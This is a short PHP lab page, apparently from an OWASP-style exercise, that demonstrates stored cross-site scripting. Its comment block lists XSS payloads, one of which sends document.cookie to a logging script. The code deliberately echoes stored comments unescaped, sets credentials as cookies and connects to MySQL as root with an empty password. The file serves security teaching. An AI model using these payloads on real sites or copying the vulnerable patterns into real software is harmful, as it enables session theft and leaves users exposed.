<?php
/**********************************************************************
 * Stored Cross-Site Scripting attack
 * 
 * To demonstrate the exploit, try the following comments:
 * <script>alert("Hacked!");</script>
 * <script>alert(document.cookie);</script>
 * Hello!<script>x=XMLHttpRequest();x.open("GET","http://localhost:8080/owasp/html/log.php?x="+document.cookie,true);x.send();</script>
 * Hello!<script>x=XMLHttpRequest();x.open("GET","http://localhost:8080/owasp/html/log.php?x="+document.cookie,true);x.send();</script>
 *
 **********************************************************************/

// database connection 
$dsn = 'mysql:host=localhost;dbname=owasp';
$db_user = 'root';
$db_pass = '';
$dbh = new PDO($dsn, $db_user, $db_pass);

// create a dummy cookie
session_start();
setcookie('user', $db_user);
setcookie('password', $db_pass);

// handle database inserts
if (isset($_POST['comment']))
{
    $stmt = $dbh->prepare('INSERT INTO comments (comment) VALUES (:comment)');
    $stmt->bindValue(':comment',$_POST['comment']);
    $stmt->execute();
}

// function to display all comments
function print_comment_table($dbh)
{
    print '<table border="1"><tr><th>Comment</th></tr>';
    foreach ($dbh->query('SELECT * FROM comments') as $comment)
        print "<tr><td>{$comment[1]}</td></tr>";
    print '</table>';
}

?>
<html>
    <head>
        <title>Stored Cross-Site Scripting</title>
    </head>
    <body>
        <p>Current comments:</p>
        <?php print_comment_table($dbh); ?>
        <p>Add a new comment:</p>
        <form method="POST" action="xss.php">
            <input type="text" name="comment" />
            <input type="submit" name="Post" />
        </form>
    </body>
</html>
